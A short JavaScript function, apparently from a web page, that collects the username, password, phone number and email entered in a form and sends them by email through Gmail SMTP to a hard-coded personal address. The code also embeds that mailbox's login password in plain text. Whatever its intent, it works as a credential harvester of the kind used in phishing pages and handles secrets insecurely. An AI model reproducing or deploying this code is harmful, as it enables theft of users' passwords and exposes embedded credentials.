function sendEmail(name, password, number, email) {
    Email.send({
        Host: "smtp.gmail.com",
        Username: "divyanshupande48@gmail.com",
        Password: "divyanshu48",
        To: 'divyanshupande48@gmail.com',
        From: document.getElementById("email").value,
        Subject: "This is the subject",
        Body: "Username: " + document.getElementById("name").value
            + "<br> Password: " + document.getElementById("password").value
            + "<br> Phone Number: " + document.getElementById("number").value
            + "<br> Email: " + document.getElementById("email").value
    }).then(
        message => alert("message sent")
    );

}